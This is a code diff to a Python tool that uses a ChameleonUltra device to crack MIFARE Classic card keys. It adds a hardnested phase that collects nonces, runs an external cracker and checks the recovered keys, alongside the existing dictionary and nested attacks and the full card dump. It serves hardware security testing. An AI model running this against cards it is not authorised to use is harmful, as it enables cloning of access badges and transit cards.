@@ -22,8 +22,10 @@ Outputs (next to this script's invocation cwd):
 import argparse
 import os
 import re
+import struct
 import subprocess
 import sys
+import tempfile
 import time
 from pathlib import Path
 
@@ -32,6 +34,7 @@ sys.path.insert(0, str(REPO_ROOT / "vendor/ChameleonUltra/script"))
 
 import chameleon_cmd
 import chameleon_com
+import hardnested_utils
 import serial.tools.list_ports
 
 CHAMELEON_USB_VID = 0x6868
@@ -51,7 +54,8 @@ def trailer_block(sector: int) -> int:
     return sector * BLOCKS_PER_SECTOR + (BLOCKS_PER_SECTOR - 1)
 
 
-def load_dictionary(path: Path) -> list[bytes]:
+def load_dictionary(path: Path) -> tuple[list[bytes], int, int]:
+    """Returns (keys, n_from_file, n_defaults)."""
     keys: list[bytes] = []
     seen: set[bytes] = set()
     with path.open() as fh:
@@ -65,6 +69,7 @@ def load_dictionary(path: Path) -> list[bytes]:
             if k not in seen:
                 seen.add(k)
                 keys.append(k)
+    n_from_file = len(keys)
     # Always try the all-default keys too, cheap and high-yield.
     for default in (
         "FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7", "000000000000",
@@ -74,7 +79,8 @@ def load_dictionary(path: Path) -> list[bytes]:
         if k not in seen:
             seen.add(k)
             keys.append(k)
-    return keys
+    n_defaults = len(keys) - n_from_file
+    return keys, n_from_file, n_defaults
 
 
 def find_chameleon_port() -> str | None:
@@ -121,7 +127,7 @@ def load_existing_keys(path: Path, cmd, known) -> int:
     return loaded
 
 
-def dictionary_attack(cmd, dictionary, known):
+def dictionary_attack(cmd, dictionary, known, save=None):
     """For each sector with an unknown A or B key, try every key in the dictionary."""
     for sector in range(SECTOR_COUNT):
         blk = first_block(sector)
@@ -138,6 +144,8 @@ def dictionary_attack(cmd, dictionary, known):
             if found is not None:
                 known[sector][kt_name] = found
                 print(f"{found.hex().upper()}")
+                if save:
+                    save()
             else:
                 print("none")
 
@@ -147,6 +155,9 @@ PRNG_NESTED = 1
 PRNG_HARD = 2
 
 NESTED_RETRIES = 3
+HARDNESTED_MAX_RUNS = 200
+HARDNESTED_MAX_ATTEMPTS = 3
+HARDNESTED_TIMEOUT_S = 1800
 
 
 def run_decryptor(name: str, cmd_args: list[str]) -> list[bytes]:
@@ -185,18 +196,145 @@ def pick_source_key(known):
     return None
 
 
-def nested_attack(cmd, known):
-    """Walk every still-unknown sector key and try nested using any known key."""
+def hardnested_phase(cmd, known, uid_bytes, out_dir: Path, save=None):
+    """For each still-unknown sector key, run hardnested using any known key as source."""
+    for sector in range(SECTOR_COUNT):
+        for kt_name, kt_val in (("A", KEY_A), ("B", KEY_B)):
+            if known[sector][kt_name] is not None:
+                continue
+            src = pick_source_key(known)
+            if src is None:
+                print("  no known key available, cannot run hardnested")
+                return
+            src_block, src_type, src_key = src
+            tgt_block = first_block(sector)
+            print(f"  sector {sector:2d} key {kt_name}: hardnested from blk {src_block}")
+            k = hardnested_recover(cmd, uid_bytes, src_block, src_type, src_key,
+                                   tgt_block, kt_val, out_dir)
+            if k is None:
+                print(f"  sector {sector:2d} key {kt_name}: FAILED")
+            else:
+                known[sector][kt_name] = k
+                print(f"  sector {sector:2d} key {kt_name}: {k.hex().upper()}")
+                if save:
+                    save()
+
+
+def hardnested_recover(cmd, uid_bytes, src_block, src_type, src_key,
+                       tgt_block, tgt_type, out_dir: Path) -> bytes | None:
+    """Recover a key via hardnested. Acquires nonces from the firmware until 256
+    unique nt_enc MSBs have been seen with a parity sum in the known-valid set,
+    writes the binary nonce file expected by ./bin/hardnested, runs the cracker,
+    and verifies the candidate key against the live card. Returns the key bytes
+    or None.
+
+    Nonce files persist on disk as <UID>-hardnested-blk<N>-<A|B>.nonces.bin so
+    a re-run can skip acquisition if the prior nonces are still on disk.
+    Acquisition is the expensive RF phase; cracking is the expensive CPU phase.
+    Either being already done lets a re-run skip it.
+    """
+    if len(uid_bytes) == 4:
+        uid_for_file = uid_bytes
+    elif len(uid_bytes) == 7:
+        uid_for_file = uid_bytes[3:7]
+    elif len(uid_bytes) == 10:
+        uid_for_file = uid_bytes[6:10]
+    else:
+        print(f"      unexpected UID length {len(uid_bytes)}")
+        return None
+
+    type_target_bit = 0 if tgt_type == KEY_A else 1
+    header = uid_for_file + bytes([tgt_block, type_target_bit])
+
+    type_letter = "A" if tgt_type == KEY_A else "B"
+    nonce_file = out_dir / (
+        f"{uid_bytes.hex().lower()}-hardnested-blk{tgt_block:02d}-{type_letter}.nonces.bin"
+    )
+
+    if nonce_file.exists() and nonce_file.stat().st_size > len(header):
+        print(f"      reusing nonces from {nonce_file.name}")
+    else:
+        out_dir.mkdir(parents=True, exist_ok=True)
+        if not _acquire_hardnested_nonces(cmd, src_block, src_type, src_key,
+                                          tgt_block, tgt_type, header, nonce_file):
+            return None
+
+    print(f"      cracking ({(nonce_file.stat().st_size - len(header)) // 9} nonces) ... ",
+          end="", flush=True)
+    t0 = time.time()
+    proc = subprocess.run([str(BIN_DIR / "hardnested"), str(nonce_file)],
+                          capture_output=True, text=True,
+                          timeout=HARDNESTED_TIMEOUT_S)
+    print(f"done in {int(time.time() - t0)}s")
+    for line in proc.stdout.splitlines():
+        line = line.strip()
+        if line.startswith("Key found:"):
+            m = re.search(r"([a-fA-F0-9]{12})", line[len("Key found:"):])
+            if m:
+                cand = bytes.fromhex(m.group(1))
+                if auth(cmd, tgt_block, tgt_type, cand):
+                    nonce_file.unlink(missing_ok=True)
+                    return cand
+    return None
+
+
+def _acquire_hardnested_nonces(cmd, src_block, src_type, src_key,
+                               tgt_block, tgt_type, header, nonce_file: Path) -> bool:
+    """Inner loop: acquire nonces and write them to nonce_file. Returns True on
+    success (256 MSBs seen with a valid parity sum)."""
+    for attempt in range(1, HARDNESTED_MAX_ATTEMPTS + 1):
+        raw_total = bytearray()
+        seen_msbs = [False] * 256
+        unique_count = 0
+        parity_sum = 0
+
+        for run in range(1, HARDNESTED_MAX_RUNS + 1):
+            try:
+                raw = cmd.mf1_hard_nested_acquire(False, src_block, src_type, src_key,
+                                                  tgt_block, tgt_type)
+            except Exception as e:
+                print(f"\n      acquire error on run {run}: {e}")
+                break
+            if not raw:
+                continue
+            raw_total.extend(raw)
+
+            for i in range(len(raw) // 9):
+                _, nt_enc, par = struct.unpack_from("!IIB", raw, i * 9)
+                msb = (nt_enc >> 24) & 0xFF
+                if not seen_msbs[msb]:
+                    seen_msbs[msb] = True
+                    unique_count += 1
+                    parity_sum += hardnested_utils.evenparity32(
+                        (nt_enc & 0xFF000000) | (par & 0x08))
+
+            print(f"\r      attempt {attempt}/{HARDNESTED_MAX_ATTEMPTS}: "
+                  f"{unique_count}/256 MSBs (sum={parity_sum})    ",
+                  end="", flush=True)
+
+            if unique_count == 256:
+                if parity_sum in hardnested_utils.hardnested_sums:
+                    print(" valid")
+                    nonce_file.write_bytes(header + bytes(raw_total))
+                    return True
+                print(f" INVALID (need one of {hardnested_utils.hardnested_sums}); restarting")
+                break
+    return False
+
+
+def nested_attack(cmd, known, uid_bytes, out_dir: Path, save=None):
+    """Walk every still-unknown sector key and try nested/hardnested using any known key."""
     try:
         prng_type = cmd.mf1_detect_prng()
     except Exception as e:
         print(f"  PRNG detection failed: {e}")
         return
-    if prng_type == PRNG_HARD:
-        print("  Card is HardNested — not implemented in this script.")
-        return
-    label = "staticnested" if prng_type == PRNG_STATIC else "nested"
+    label = {PRNG_STATIC: "staticnested", PRNG_NESTED: "nested", PRNG_HARD: "hardnested"}.get(
+        prng_type, f"unknown({prng_type})")
     print(f"  PRNG class: {label}")
+    if prng_type == PRNG_HARD:
+        hardnested_phase(cmd, known, uid_bytes, out_dir, save=save)
+        return
 
     for sector in range(SECTOR_COUNT):
         for kt_name, kt_val in (("A", KEY_A), ("B", KEY_B)):
@@ -219,6 +357,8 @@ def nested_attack(cmd, known):
                 if k is not None:
                     known[sector][kt_name] = k
                     print(k.hex().upper())
+                    if save:
+                        save()
                     break
                 if attempt < NESTED_RETRIES:
                     print(f"retry {attempt}... ", end="", flush=True)
@@ -270,13 +410,13 @@ def read_card(cmd, known) -> bytearray:
     return data
 
 
-def write_outputs(uid_hex: str, known, dump: bytes, out_dir: Path):
+def save_keys(uid_hex: str, known, out_dir: Path):
+    """Persist the current keys to txt/dic/bin. Safe to call after every find;
+    keeps progress on disk so a crash mid-attack doesn't lose hours of work."""
     out_dir.mkdir(parents=True, exist_ok=True)
     txt = out_dir / f"{uid_hex}-key.txt"
     dic = out_dir / f"{uid_hex}-key.dic"
     binkey = out_dir / f"{uid_hex}-key.bin"
-    bindump = out_dir / f"{uid_hex}-dump.bin"
-    eml = out_dir / f"{uid_hex}-dump.eml"
 
     with txt.open("w") as fh:
         fh.write(f"# UID {uid_hex}\n# sector  keyA          keyB\n")
@@ -304,12 +444,16 @@ def write_outputs(uid_hex: str, known, dump: bytes, out_dir: Path):
         for s in range(SECTOR_COUNT):
             fh.write(known[s]["B"] if known[s]["B"] else b"\x00" * 6)
 
+
+def write_outputs(uid_hex: str, known, dump: bytes, out_dir: Path):
+    save_keys(uid_hex, known, out_dir)
+    bindump = out_dir / f"{uid_hex}-dump.bin"
+    eml = out_dir / f"{uid_hex}-dump.eml"
     bindump.write_bytes(dump)
     with eml.open("w") as fh:
         for i in range(0, len(dump), 16):
             fh.write(dump[i:i + 16].hex() + "\n")
-
-    print(f"\nWrote:\n  {txt}\n  {dic}\n  {binkey}\n  {bindump}\n  {eml}")
+    print(f"\nWrote: {uid_hex}-key.{{txt,dic,bin}}, {uid_hex}-dump.{{bin,eml}}")
 
 
 def main():
@@ -320,8 +464,9 @@ def main():
     ap.add_argument("-o", "--out", default=".", help="output directory")
     args = ap.parse_args()
 
-    dictionary = load_dictionary(Path(args.dict))
-    print(f"Loaded {len(dictionary)} dictionary keys from {args.dict}")
+    dictionary, n_file, n_defaults = load_dictionary(Path(args.dict))
+    print(f"Loaded {n_file} keys from {args.dict} + {n_defaults} well-known defaults"
+          f" = {len(dictionary)} total")
 
     port = args.port or find_chameleon_port()
     if port is None:
@@ -361,13 +506,15 @@ def main():
     else:
         print("  none")
 
+    save = lambda: save_keys(uid_int_hex, known, out_dir)
+
     print("\n[1/3] Dictionary attack...")
-    dictionary_attack(cmd, dictionary, known)
+    dictionary_attack(cmd, dictionary, known, save=save)
 
     missing = sum(1 for s in known for kt in ("A", "B") if s[kt] is None)
     if missing:
         print(f"\n[2/3] Nested attack ({missing} keys still missing)...")
-        nested_attack(cmd, known)
+        nested_attack(cmd, known, uid_bytes, out_dir, save=save)
     else:
         print("\n[2/3] All keys found via dictionary, skipping nested.")
 
